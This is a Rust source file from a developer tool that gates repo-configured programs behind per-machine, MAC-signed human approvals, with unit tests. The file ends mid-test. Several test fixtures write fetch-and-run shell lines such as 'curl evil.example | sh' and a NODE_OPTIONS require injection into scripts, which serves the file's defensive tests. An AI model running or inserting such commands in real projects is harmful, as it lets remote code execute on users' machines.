//! Consent to run programs from the project (tsk331, [[tsk162]]).
//!
//! A repo's `.oxplow/project.yaml` can name a program to run: an `exec`
//! gauge or collection plugin, or (in an extension) an `exec` source. A
//! cloned or pulled repo is untrusted, so none of these run until a person
//! approves the program on this machine. An approval is bound to a hash of
//! what runs (the program's content, plus its args or its network list), so
//! a change needs approving again. Approvals live outside every repo
//! ([`ApprovalStore`]: `<oxplow home>/approvals/`, each entry MACed under a
//! keychain key), per machine: a teammate approves for themselves, a repo
//! can't ship one, and an agent's shell can't forge one. Agents can't
//! approve.
//!
//! Global-scope gauges are the user's own config and aren't gated.
//! See `.context/semantic-layer.md` → "User and extension sources" and
//! `.context/metrics.md`.

use std::collections::BTreeMap;
use std::path::Path;

use serde::{Deserialize, Serialize};

/// The approvals file oxplow used to keep inside the repo. It is never
/// read: a repo could commit one, or an agent write one, and
/// pre-approve its own programs.
pub const LEGACY_APPROVALS_FILE: &str = "source-approvals.json";

/// Keychain name of the key approvals are MACed with.
const MAC_KEY_SECRET: &str = "approvals-mac-key";

/// This machine's approvals of one project's programs (tsk344).
///
/// They live outside every repo, in `<oxplow home>/approvals/`, keyed
/// by the canonical project path, so neither a committed file nor an
/// in-tree write grants consent. Each entry also carries an HMAC under
/// a random key kept in the OS keychain, so a process that can write
/// files as the user (an agent's shell) still can't forge one.
pub struct ApprovalStore {
    file: Option<std::path::PathBuf>,
    project: String,
    secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
    /// The MAC key, read from the keychain once per process (an unsigned
    /// dev build re-prompts on every keychain read).
    key: parking_lot::Mutex<Option<Vec<u8>>>,
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct ApprovalFile {
    /// The project these approvals are for (for a person reading it).
    #[serde(default)]
    project: String,
    /// Approval key (`<ext>/<source>`, `gauge:<key>`, `plugin:<name>`,
    /// `acp:<name>`) → the approved hash and its MAC.
    #[serde(default)]
    approved: BTreeMap<String, Approval>,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
struct Approval {
    hash: String,
    mac: String,
}

impl ApprovalStore {
    /// The store for `project_dir` under the oxplow home (`None` when the
    /// home dir can't be found: then nothing is ever approved).
    pub fn for_project(
        project_dir: &Path,
        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
    ) -> Self {
        let file =
            oxplow_config::global_config_dir().map(|home| approvals_file(&home, project_dir));
        Self::new(file, project_dir, secrets)
    }

    /// A store at `file` (tests, in-memory services).
    pub fn at(
        file: std::path::PathBuf,
        project_dir: &Path,
        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
    ) -> Self {
        Self::new(Some(file), project_dir, secrets)
    }

    /// A store that approves nothing (a service built without one).
    pub fn disabled() -> Self {
        Self::new(
            None,
            Path::new(""),
            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
        )
    }

    /// A throwaway store for tests: under `dir`, with an in-memory keychain.
    #[doc(hidden)]
    pub fn for_tests(dir: &Path) -> Self {
        Self::at(
            dir.join(".test-oxplow-home/approvals.json"),
            dir,
            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
        )
    }

    fn new(
        file: Option<std::path::PathBuf>,
        project_dir: &Path,
        secrets: std::sync::Arc<dyn oxplow_ai::secrets::SecretStore>,
    ) -> Self {
        Self {
            file,
            project: canonical(project_dir).to_string_lossy().into_owned(),
            secrets,
            key: parking_lot::Mutex::new(None),
        }
    }

    fn read(&self) -> ApprovalFile {
        self.file
            .as_ref()
            .and_then(|f| std::fs::read_to_string(f).ok())
            .and_then(|t| serde_json::from_str(&t).ok())
            .unwrap_or_default()
    }

    /// The MAC key; created on first approval when `create`.
    fn mac_key(&self, create: bool) -> Option<Vec<u8>> {
        let mut cached = self.key.lock();
        if let Some(k) = cached.as_ref() {
            return Some(k.clone());
        }
        let stored = self.secrets.get(MAC_KEY_SECRET).ok().flatten();
        let key = match stored {
            Some(hex_key) => hex::decode(hex_key).ok()?,
            None if create => {
                let fresh: Vec<u8> = [uuid::Uuid::new_v4(), uuid::Uuid::new_v4()]
                    .iter()
                    .flat_map(|u| u.as_bytes().to_vec())
                    .collect();
                self.secrets
                    .set(MAC_KEY_SECRET, &hex::encode(&fresh))
                    .ok()?;
                fresh
            }
            None => return None,
        };
        *cached = Some(key.clone());
        Some(key)
    }

    fn mac(&self, key: &[u8], approval_key: &str, hash: &str) -> String {
        use hmac::{KeyInit, Mac};
        let Ok(mut m) = hmac::Hmac::<sha2::Sha256>::new_from_slice(key) else {
            return String::new();
        };
        for part in [self.project.as_str(), approval_key, hash] {
            m.update(part.as_bytes());
            m.update(&[0u8]);
        }
        hex::encode(m.finalize().into_bytes())
    }

    /// Whether `key` is approved at exactly `hash`, by this machine.
    pub fn is_approved(&self, key: &str, hash: &str) -> bool {
        let Some(entry) = self.read().approved.get(key).cloned() else {
            return false;
        };
        if entry.hash != hash {
            return false;
        }
        self.mac_key(false)
            .is_some_and(|k| !entry.mac.is_empty() && self.mac(&k, key, hash) == entry.mac)
    }

    /// Record a person's approval of `key` at `hash`.
    pub fn approve(&self, key: &str, hash: &str) -> std::io::Result<()> {
        let file = self
            .file
            .as_ref()
            .ok_or_else(|| std::io::Error::other("no oxplow home dir to keep approvals in"))?;
        let mac_key = self
            .mac_key(true)
            .ok_or_else(|| std::io::Error::other("the OS keychain is unavailable"))?;
        let mut data = self.read();
        data.project = self.project.clone();
        data.approved.insert(
            key.to_string(),
            Approval {
                hash: hash.to_string(),
                mac: self.mac(&mac_key, key, hash),
            },
        );
        if let Some(dir) = file.parent() {
            std::fs::create_dir_all(dir)?;
        }
        let text = serde_json::to_string_pretty(&data).map_err(std::io::Error::other)?;
        std::fs::write(file, text)
    }
}

fn canonical(p: &Path) -> std::path::PathBuf {
    p.canonicalize().unwrap_or_else(|_| p.to_path_buf())
}

/// `<home>/approvals/<sha256 of the canonical project path>.json`.
fn approvals_file(home: &Path, project_dir: &Path) -> std::path::PathBuf {
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(canonical(project_dir).to_string_lossy().as_bytes());
    home.join("approvals")
        .join(format!("{}.json", &hex::encode(digest)[..32]))
}

/// What kind of project program it is.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "lowercase")]
pub enum ProgramKind {
    /// A metric gauge (`gauges:`).
    Gauge,
    /// A collection plugin (`collection.plugins`) parsing test/coverage/analysis reports.
    Plugin,
    /// An agent spoken to over ACP (`acpAgents`, tsk335).
    #[serde(rename = "acp-agent")]
    AcpAgent,
    /// A shared extension's advisories: SQL whose results go into the
    /// agent's context (tsk352). Bundled extensions' aren't gated.
    Advisories,
    /// An extension's provider (`providers:`): a long-lived program
    /// implementing a capability, approved with its declarations.
    Provider,
}

/// A program the project's config would run.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize, specta::Type)]
#[serde(rename_all = "camelCase")]
pub struct ProjectProgram {
    pub kind: ProgramKind,
    /// The gauge key or plugin name.
    pub name: String,
    /// Project-relative path of the program.
    pub program: String,
    pub args: Vec<String>,
    /// Extra environment it runs with, as `NAME=value` (ACP agents), or
    /// the host variables it gets by name (a provider).
    pub env: Vec<String>,
    /// Keychain credentials it gets, by name (a provider).
    pub credentials: Vec<String>,
    /// Hosts it may reach (a provider).
    pub network: Vec<String>,
    /// The project-relative folder whose every file the approval covers
    /// (a provider's extension, declarations included).
    pub tree: Option<String>,
    /// This machine approved it as it is now.
    pub approved: bool,
    /// Its approval hash as it is now (`None` when it can't be read). The
    /// person's approve click sends back the version they reviewed.
    pub version: Option<String>,
}

impl ProjectProgram {
    pub fn key(&self) -> String {
        match self.kind {
            ProgramKind::Gauge => format!("gauge:{}", self.name),
            ProgramKind::Plugin => format!("plugin:{}", self.name),
            ProgramKind::AcpAgent => format!("acp:{}", self.name),
            ProgramKind::Advisories => format!("advisories:{}", self.name),
            ProgramKind::Provider => format!("provider:{}", self.name),
        }
    }

    /// What its approval covers, run from `project_dir` (see [`Self::hash_at`]).
    pub fn hash(&self, project_dir: &Path) -> std::io::Result<String> {
        self.hash_at(project_dir, project_dir)
    }

    /// What its approval covers, as it would run with working dir `cwd`:
    /// - the program's content (when it's a file in the project), and for
    ///   a gauge or plugin the other files in its directory (a script
    ///   sourcing a helper) unless that directory is the project root;
    /// - every arg, and the content of each arg that names a file under
    ///   `cwd` (the script an interpreter like `node` runs);
    /// - its env.
    ///
    /// A gauge or plugin names a project file, which must exist; an ACP
    /// agent's command may be a program on PATH, covered by its name.
    pub fn hash_at(&self, project_dir: &Path, cwd: &Path) -> std::io::Result<String> {
        use sha2::{Digest, Sha256};
        let mut h = Sha256::new();
        let file = project_dir.join(&self.program);
        match self.kind {
            ProgramKind::Gauge | ProgramKind::Plugin => {
                h.update(std::fs::read(&file)?);
                if let Some(dir) = Path::new(&self.program)
                    .parent()
                    .filter(|d| !d.as_os_str().is_empty())
                {
                    h.update([2u8]);
                    h.update(tree_hash(&project_dir.join(dir))?.as_bytes());
                }
            }
            // Covered by what it says: each advisory is an arg (below).
            ProgramKind::Advisories => h.update(self.program.as_bytes()),
            // The entry, and every file of its extension but what isn't
            // code it runs (the manifest, whose grants are hashed below,
            // and lenses) — so its declarations file too.
            ProgramKind::Provider => {
                h.update(self.program.as_bytes());
                h.update([0u8]);
                h.update(std::fs::read(&file)?);
                let dir = project_dir.join(self.tree.as_deref().unwrap_or_default());
                h.update([2u8]);
                h.update(
                    tree_hash_except(&dir, &|rel| {
                        rel == Path::new("extension.yaml") || rel.starts_with("lenses")
                    })?
                    .as_bytes(),
                );
            }
            ProgramKind::AcpAgent => {
                h.update(self.program.as_bytes());
                if self.program.contains('/') && file.is_file() {
                    h.update([0u8]);
                    h.update(std::fs::read(&file)?);
                }
            }
        }
        for a in &self.args {
            h.update([0u8]);
            h.update(a.as_bytes());
            let arg_file = cwd.join(a);
            if self.kind != ProgramKind::Advisories && !a.starts_with('-') && arg_file.is_file() {
                h.update([3u8]);
                h.update(std::fs::read(&arg_file)?);
            }
        }
        for e in &self.env {
            h.update([1u8]);
            h.update(e.as_bytes());
        }
        for c in &self.credentials {
            h.update([4u8]);
            h.update(c.as_bytes());
        }
        for n in &self.network {
            h.update([5u8]);
            h.update(n.as_bytes());
        }
        Ok(hex::encode(h.finalize()))
    }
}

/// Most files and bytes [`tree_hash`] covers; a bigger directory can't be
/// approved as a whole (move the script into its own directory).
const TREE_MAX_FILES: usize = 500;
const TREE_MAX_BYTES: u64 = 16 * 1024 * 1024;

/// SHA-256 over every file under `dir` (relative path + content, sorted),
/// skipping dot-directories. What an approval of a script's directory
/// covers: change any helper and it needs approving again.
pub fn tree_hash(dir: &Path) -> std::io::Result<String> {
    tree_hash_except(dir, &|_| false)
}

/// [`tree_hash`] leaving out files whose path relative to `dir` `skip`
/// accepts.
pub fn tree_hash_except(dir: &Path, skip: &dyn Fn(&Path) -> bool) -> std::io::Result<String> {
    use sha2::{Digest, Sha256};
    let mut files: Vec<std::path::PathBuf> = walkdir::WalkDir::new(dir)
        .follow_links(false)
        .into_iter()
        .filter_entry(|e| e.depth() == 0 || !e.file_name().to_string_lossy().starts_with('.'))
        .filter_map(Result::ok)
        .filter(|e| e.file_type().is_file())
        .map(|e| e.into_path())
        .filter(|p| !skip(p.strip_prefix(dir).unwrap_or(p)))
        .collect();
    files.sort();
    if files.len() > TREE_MAX_FILES {
        return Err(std::io::Error::other(format!(
            "{} has more than {TREE_MAX_FILES} files to approve; give the program its own directory",
            dir.display()
        )));
    }
    let mut h = Sha256::new();
    let mut total = 0u64;
    for f in files {
        let bytes = std::fs::read(&f)?;
        total += bytes.len() as u64;
        if total > TREE_MAX_BYTES {
            return Err(std::io::Error::other(format!(
                "{} is too large to approve as a whole; give the program its own directory",
                dir.display()
            )));
        }
        let rel = f.strip_prefix(dir).unwrap_or(&f);
        h.update(rel.to_string_lossy().as_bytes());
        h.update([0u8]);
        h.update(&bytes);
        h.update([0u8]);
    }
    Ok(hex::encode(h.finalize()))
}

/// What an approval of a program covers: its content and its args.
pub fn program_hash(project_dir: &Path, program: &str, args: &[String]) -> std::io::Result<String> {
    ProjectProgram {
        kind: ProgramKind::Gauge,
        name: String::new(),
        program: program.to_string(),
        args: args.to_vec(),
        env: Vec::new(),
        credentials: Vec::new(),
        network: Vec::new(),
        tree: None,
        approved: false,
        version: None,
    }
    .hash(project_dir)
}

/// Whether `kind`/`name` running `program args` may run: approved on this
/// machine at its current content and args.
pub fn may_run(
    store: &ApprovalStore,
    project_dir: &Path,
    kind: ProgramKind,
    name: &str,
    program: &str,
    args: &[String],
) -> bool {
    let p = ProjectProgram {
        kind,
        name: name.to_string(),
        program: program.to_string(),
        args: args.to_vec(),
        env: Vec::new(),
        credentials: Vec::new(),
        network: Vec::new(),
        tree: None,
        approved: false,
        version: None,
    };
    approved_now(store, project_dir, &p)
}

/// Whether `p` is approved on this machine as it is now.
fn approved_now(store: &ApprovalStore, project_dir: &Path, p: &ProjectProgram) -> bool {
    approved_at(store, project_dir, project_dir, p)
}

/// Whether `p`, run with working dir `cwd`, is what was approved.
fn approved_at(store: &ApprovalStore, project_dir: &Path, cwd: &Path, p: &ProjectProgram) -> bool {
    p.hash_at(project_dir, cwd)
        .is_ok_and(|h| store.is_approved(&p.key(), &h))
}

/// A project ACP agent as a program to approve. Presets aren't project
/// programs and never need approval.
pub fn acp_program(agent: &oxplow_config::AcpAgentConfig) -> ProjectProgram {
    ProjectProgram {
        kind: ProgramKind::AcpAgent,
        name: agent.name.clone(),
        program: agent.command.clone(),
        args: agent.args.clone(),
        env: agent.env.iter().map(|(k, v)| format!("{k}={v}")).collect(),
        credentials: Vec::new(),
        network: Vec::new(),
        tree: None,
        approved: false,
        version: None,
    }
}

/// Whether a project ACP agent may start: approved as it is now.
/// A shared extension's advisories as a program to approve: each
/// advisory (its id, trigger, repeat rule, heading and query) is an arg,
/// so the person reads exactly what may speak into the agent's context
/// and any change needs approving again.
pub fn advisory_program(ext: &crate::extensions::Extension) -> ProjectProgram {
    let text = |v: serde_json::Value| v.as_str().unwrap_or_default().to_string();
    ProjectProgram {
        kind: ProgramKind::Advisories,
        name: ext.name.clone(),
        program: format!("{}/extension.yaml", ext.path.trim_end_matches('/')),
        args: ext
            .advisories
            .iter()
            .map(|a| {
                format!(
                    "{} (on {}, once per {}{}): {}",
                    a.id,
                    text(serde_json::to_value(a.on).unwrap_or_default()),
                    text(serde_json::to_value(a.once_per).unwrap_or_default()),
                    a.heading
                        .as_deref()
                        .map(|h| format!(", heading {h:?}"))
                        .unwrap_or_default(),
                    a.query.trim()
                )
            })
            .collect(),
        env: Vec::new(),
        credentials: Vec::new(),
        network: Vec::new(),
        tree: None,
        approved: false,
        version: None,
    }
}

/// An extension's provider as a program to approve: its entry, args,
/// env names, credentials and network, over the extension folder's files
/// (declarations included).
pub fn provider_program(
    ext: &crate::extensions::Extension,
    spec: &crate::providers::ProviderSpec,
) -> ProjectProgram {
    let dir = ext.path.trim_end_matches('/');
    ProjectProgram {
        kind: ProgramKind::Provider,
        name: spec.approval_name(&ext.name),
        program: format!("{dir}/{}", spec.entry),
        args: spec.args.clone(),
        env: spec.env.clone(),
        credentials: spec.credentials.clone(),
        network: spec.network.clone(),
        tree: Some(dir.to_string()),
        approved: false,
        version: None,
    }
}

/// Whether an extension's provider may start: approved as it is now.
pub fn may_run_provider(
    store: &ApprovalStore,
    project_dir: &Path,
    ext: &crate::extensions::Extension,
    spec: &crate::providers::ProviderSpec,
) -> bool {
    // The listing hashes it the same way; its files are the tree's.
    approved_now(store, project_dir, &provider_program(ext, spec))
}

/// Extensions whose advisories need a person's approval: enabled,
/// shared (not bundled with oxplow) and declaring some.
pub fn gated_advisories(
    extensions: &[crate::extensions::Extension],
) -> impl Iterator<Item = &crate::extensions::Extension> {
    extensions
        .iter()
        .filter(|e| e.enabled && e.origin != "bundled" && !e.advisories.is_empty())
}

/// Whether a project ACP agent may start in `cwd` (its stream's
/// worktree): approved as it is now, with its script args read there.
pub fn may_run_acp(
    store: &ApprovalStore,
    project_dir: &Path,
    cwd: &Path,
    agent: &oxplow_config::AcpAgentConfig,
) -> bool {
    approved_at(store, project_dir, cwd, &acp_program(agent))
}

/// Why an unapproved program didn't run, for logs and errors.
pub fn needs_approval(kind: ProgramKind, name: &str, program: &str) -> String {
    let what = match kind {
        ProgramKind::Gauge => "gauge",
        ProgramKind::Plugin => "collection plugin",
        ProgramKind::AcpAgent => "ACP agent",
        ProgramKind::Advisories => "extension advisories",
        ProgramKind::Provider => "provider",
    };
    format!(
        "{what} `{name}` runs `{program}` from the project's config and needs a person's approval first \
         (Settings → Data → Programs). Approval is per machine and per version of the program and its args."
    )
}

/// Every project-scope exec gauge and collection plugin in `config`, with
/// whether it's approved.
pub fn list(
    store: &ApprovalStore,
    project_dir: &Path,
    config: &oxplow_config::OxplowConfig,
    extensions: &[crate::extensions::Extension],
) -> Vec<ProjectProgram> {
    let mut out = Vec::new();
    let mut push = |kind, name: &str, program: Option<&str>, args: &[String]| {
        let Some(program) = program else { return };
        out.push(ProjectProgram {
            kind,
            name: name.to_string(),
            program: program.to_string(),
            args: args.to_vec(),
            env: Vec::new(),
            credentials: Vec::new(),
            network: Vec::new(),
            tree: None,
            approved: false,
            version: None,
        });
    };
    for g in &config.gauges {
        let Some(c) = g.compute.as_ref() else {
            continue;
        };
        if c.runtime == "exec" {
            push(
                ProgramKind::Gauge,
                g.key.as_deref().unwrap_or_default(),
                c.entry_file.as_deref(),
                &c.args,
            );
        }
    }
    for p in &config.collection.plugins {
        if p.runtime == "exec" {
            push(
                ProgramKind::Plugin,
                &p.name,
                p.entry_file.as_deref(),
                &p.args,
            );
        }
    }
    out.extend(config.acp_agents.iter().map(acp_program));
    out.extend(gated_advisories(extensions).map(advisory_program));
    out.extend(extensions.iter().filter(|e| e.enabled).flat_map(|e| {
        e.providers
            .iter()
            .map(move |spec| provider_program(e, spec))
    }));
    for p in &mut out {
        p.version = p.hash(project_dir).ok();
        p.approved = p
            .version
            .as_ref()
            .is_some_and(|h| store.is_approved(&p.key(), h));
    }
    out
}

/// The version of `kind`/`name` a listing would show now (tests; the UI
/// reads it from [`list`]).
#[doc(hidden)]
pub fn version_of(
    store: &ApprovalStore,
    project_dir: &Path,
    config: &oxplow_config::OxplowConfig,
    kind: ProgramKind,
    name: &str,
) -> String {
    list(store, project_dir, config, &[])
        .into_iter()
        .find(|p| p.kind == kind && p.name == name)
        .and_then(|p| p.version)
        .unwrap_or_default()
}

/// Approve the project program `kind`/`name` as it is now. Only a person
/// calls this (the Settings → Data button).
///
/// `version` is the one the person reviewed (from the listing): if the
/// program changed since, nothing is approved.
pub fn approve_program(
    store: &ApprovalStore,
    project_dir: &Path,
    config: &oxplow_config::OxplowConfig,
    extensions: &[crate::extensions::Extension],
    kind: ProgramKind,
    name: &str,
    version: &str,
) -> Result<(), String> {
    let p = list(store, project_dir, config, extensions)
        .into_iter()
        .find(|p| p.kind == kind && p.name == name)
        .ok_or_else(|| format!("no exec {kind:?} named `{name}` in the project's config"))?;
    let hash = p
        .hash(project_dir)
        .map_err(|e| format!("{}: {e}", p.program))?;
    if hash != version {
        return Err(format!(
            "`{name}` changed since you reviewed it; look at it again before approving"
        ));
    }
    store
        .approve(&p.key(), &hash)
        .map_err(|e| format!("record approval: {e}"))
}

#[cfg(test)]
mod tests {
    use super::*;

    /// A store outside `dir`'s project tree, with an in-memory keychain.
    fn store(home: &Path, project: &Path) -> ApprovalStore {
        ApprovalStore::at(
            approvals_file(home, project),
            project,
            std::sync::Arc::new(oxplow_ai::secrets::MemorySecrets::default()),
        )
    }

    /// The version a person would see in the listing right now.
    fn current(
        st: &ApprovalStore,
        dir: &Path,
        cfg: &oxplow_config::OxplowConfig,
        name: &str,
    ) -> String {
        list(st, dir, cfg, &[])
            .into_iter()
            .find(|p| p.name == name)
            .and_then(|p| p.version)
            .unwrap_or_default()
    }

    fn config(dir: &Path, yaml: &str) -> oxplow_config::OxplowConfig {
        std::fs::create_dir_all(dir.join(".oxplow")).unwrap();
        std::fs::write(oxplow_config::config_path(dir), yaml).unwrap();
        oxplow_config::load_project_config(dir).unwrap()
    }

    #[test]
    fn project_programs_run_only_once_approved_at_their_content_and_args() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        std::fs::create_dir_all(dir.path().join("tools")).unwrap();
        std::fs::write(dir.path().join("tools/count.sh"), "echo 1").unwrap();
        std::fs::write(dir.path().join("tools/parse.sh"), "cat").unwrap();
        let cfg = config(
            dir.path(),
            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh, args: [--fast] }\n  - key: repo.star\n    emits: [repo.n]\n    compute: { runtime: starlark, entryFile: tools/x.star }\ncollection:\n  plugins:\n    - { name: acme.parse, kind: coverage, formats: [mine], runtime: exec, entryFile: tools/parse.sh }\n",
        );
        let listed = list(&st, dir.path(), &cfg, &[]);
        assert_eq!(
            listed
                .iter()
                .map(|p| (p.kind, p.name.as_str(), p.approved))
                .collect::<Vec<_>>(),
            vec![
                (ProgramKind::Gauge, "repo.count", false),
                (ProgramKind::Plugin, "acme.parse", false)
            ],
            "only exec entries, none approved yet"
        );
        let args = vec!["--fast".to_string()];
        assert!(!may_run(
            &st,
            dir.path(),
            ProgramKind::Gauge,
            "repo.count",
            "tools/count.sh",
            &args
        ));
        approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::Gauge,
            "repo.count",
            &current(&st, dir.path(), &cfg, "repo.count"),
        )
        .unwrap();
        assert!(may_run(
            &st,
            dir.path(),
            ProgramKind::Gauge,
            "repo.count",
            "tools/count.sh",
            &args
        ));
        // Different args or content: not what was approved.
        assert!(!may_run(
            &st,
            dir.path(),
            ProgramKind::Gauge,
            "repo.count",
            "tools/count.sh",
            &[]
        ));
        std::fs::write(dir.path().join("tools/count.sh"), "curl evil.example | sh").unwrap();
        assert!(!may_run(
            &st,
            dir.path(),
            ProgramKind::Gauge,
            "repo.count",
            "tools/count.sh",
            &args
        ));
        // The plugin is still unapproved; approving one doesn't approve another.
        assert!(!may_run(
            &st,
            dir.path(),
            ProgramKind::Plugin,
            "acme.parse",
            "tools/parse.sh",
            &[]
        ));
        assert!(approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::Plugin,
            "nope",
            &current(&st, dir.path(), &cfg, "nope")
        )
        .is_err());
    }

    #[test]
    fn project_acp_agents_need_approval_bound_to_command_args_env_and_file() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        std::fs::create_dir_all(dir.path().join("tools")).unwrap();
        std::fs::write(dir.path().join("tools/agent"), "v1").unwrap();
        let cfg = config(
            dir.path(),
            "acpAgents:\n  - { name: mine, command: tools/agent, args: [--acp], env: { MODE: fast } }\n  - { name: gemini, command: gemini, args: [--acp] }\n",
        );
        let listed = list(&st, dir.path(), &cfg, &[]);
        let acp: Vec<_> = listed
            .iter()
            .filter(|p| p.kind == ProgramKind::AcpAgent)
            .collect();
        assert_eq!(acp.len(), 2);
        assert_eq!(acp[0].env, vec!["MODE=fast".to_string()]);
        assert!(!may_run_acp(
            &st,
            dir.path(),
            dir.path(),
            &cfg.acp_agents[0]
        ));
        approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::AcpAgent,
            "mine",
            &current(&st, dir.path(), &cfg, "mine"),
        )
        .unwrap();
        assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[0]));
        // A different env, or a changed program file, isn't what was approved.
        let mut changed = cfg.acp_agents[0].clone();
        changed
            .env
            .insert("NODE_OPTIONS".into(), "--require ./x.js".into());
        assert!(!may_run_acp(&st, dir.path(), dir.path(), &changed));
        std::fs::write(dir.path().join("tools/agent"), "v2").unwrap();
        assert!(!may_run_acp(
            &st,
            dir.path(),
            dir.path(),
            &cfg.acp_agents[0]
        ));
        // A PATH program is covered by its name and args.
        approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::AcpAgent,
            "gemini",
            &current(&st, dir.path(), &cfg, "gemini"),
        )
        .unwrap();
        assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[1]));
    }

    #[test]
    fn approvals_live_outside_the_project() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let f = approvals_file(home.path(), dir.path());
        assert!(f.starts_with(home.path()));
        assert!(!f.starts_with(dir.path()));
        // Keyed by the canonical project path: another project gets another file.
        let other = tempfile::tempdir().unwrap();
        assert_ne!(f, approvals_file(home.path(), other.path()));
    }

    #[test]
    fn a_repo_supplied_or_forged_approval_grants_nothing() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        std::fs::create_dir_all(dir.path().join("tools")).unwrap();
        std::fs::write(dir.path().join("tools/count.sh"), "curl x | sh").unwrap();
        let cfg = config(
            dir.path(),
            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh }\n",
        );
        let hash = program_hash(dir.path(), "tools/count.sh", &[]).unwrap();
        let may = |st: &ApprovalStore| {
            may_run(
                st,
                dir.path(),
                ProgramKind::Gauge,
                "repo.count",
                "tools/count.sh",
                &[],
            )
        };

        // A committed (or agent-written) file in the repo, with the right hash.
        std::fs::write(
            dir.path().join(".oxplow").join(LEGACY_APPROVALS_FILE),
            format!("{{\"approved\":{{\"gauge:repo.count\":\"{hash}\"}}}}"),
        )
        .unwrap();
        assert!(!may(&st));

        // A forged entry in the real store: right hash, no valid MAC.
        let f = approvals_file(home.path(), dir.path());
        std::fs::create_dir_all(f.parent().unwrap()).unwrap();
        std::fs::write(
            &f,
            format!(
                "{{\"approved\":{{\"gauge:repo.count\":{{\"hash\":\"{hash}\",\"mac\":\"00\"}}}}}}"
            ),
        )
        .unwrap();
        assert!(!may(&st));

        // A person's approval works, and a copy MACed under another
        // machine's key (another keychain) doesn't.
        approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::Gauge,
            "repo.count",
            &current(&st, dir.path(), &cfg, "repo.count"),
        )
        .unwrap();
        assert!(may(&st));
        let elsewhere = store(home.path(), dir.path());
        assert!(!may(&elsewhere));
    }

    #[test]
    fn helper_files_and_script_args_are_part_of_what_is_approved() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        std::fs::create_dir_all(dir.path().join("tools")).unwrap();
        std::fs::write(dir.path().join("tools/count.sh"), ". tools/lib.sh").unwrap();
        std::fs::write(dir.path().join("tools/lib.sh"), "echo 1").unwrap();
        std::fs::write(dir.path().join("tools/agent.js"), "v1").unwrap();
        let cfg = config(
            dir.path(),
            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh }\nacpAgents:\n  - { name: js, command: node, args: [tools/agent.js] }\n",
        );
        let gauge_ok = |st: &ApprovalStore| {
            may_run(
                st,
                dir.path(),
                ProgramKind::Gauge,
                "repo.count",
                "tools/count.sh",
                &[],
            )
        };
        approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::Gauge,
            "repo.count",
            &current(&st, dir.path(), &cfg, "repo.count"),
        )
        .unwrap();
        approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::AcpAgent,
            "js",
            &current(&st, dir.path(), &cfg, "js"),
        )
        .unwrap();
        assert!(gauge_ok(&st));
        assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[0]));

        // A file the entry script sources.
        std::fs::write(dir.path().join("tools/lib.sh"), "curl x | sh").unwrap();
        assert!(!gauge_ok(&st));
        // The script an interpreter runs.
        std::fs::write(dir.path().join("tools/agent.js"), "v2").unwrap();
        assert!(!may_run_acp(
            &st,
            dir.path(),
            dir.path(),
            &cfg.acp_agents[0]
        ));

        // Resolved where it runs: another worktree's different copy isn't
        // what was approved.
        approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::AcpAgent,
            "js",
            &current(&st, dir.path(), &cfg, "js"),
        )
        .unwrap();
        let wt = tempfile::tempdir().unwrap();
        std::fs::create_dir_all(wt.path().join("tools")).unwrap();
        std::fs::write(wt.path().join("tools/agent.js"), "evil").unwrap();
        assert!(may_run_acp(&st, dir.path(), dir.path(), &cfg.acp_agents[0]));
        assert!(!may_run_acp(&st, dir.path(), wt.path(), &cfg.acp_agents[0]));
    }

    #[test]
    fn approval_names_the_version_the_person_saw() {
        let dir = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        let st = store(home.path(), dir.path());
        std::fs::create_dir_all(dir.path().join("tools")).unwrap();
        std::fs::write(dir.path().join("tools/count.sh"), "echo 1").unwrap();
        let cfg = config(
            dir.path(),
            "gauges:\n  - key: repo.count\n    emits: [repo.n]\n    compute: { runtime: exec, entryFile: tools/count.sh }\n",
        );
        let seen = list(&st, dir.path(), &cfg, &[])[0].version.clone().unwrap();
        // Swapped between the listing and the click: refused.
        std::fs::write(dir.path().join("tools/count.sh"), "curl x | sh").unwrap();
        let err = approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::Gauge,
            "repo.count",
            &seen,
        )
        .unwrap_err();
        assert!(err.contains("changed"), "{err}");
        assert!(!list(&st, dir.path(), &cfg, &[])[0].approved);
        let now = list(&st, dir.path(), &cfg, &[])[0].version.clone().unwrap();
        approve_program(
            &st,
            dir.path(),
            &cfg,
            &[],
            ProgramKind::Gauge,
            "repo.count",
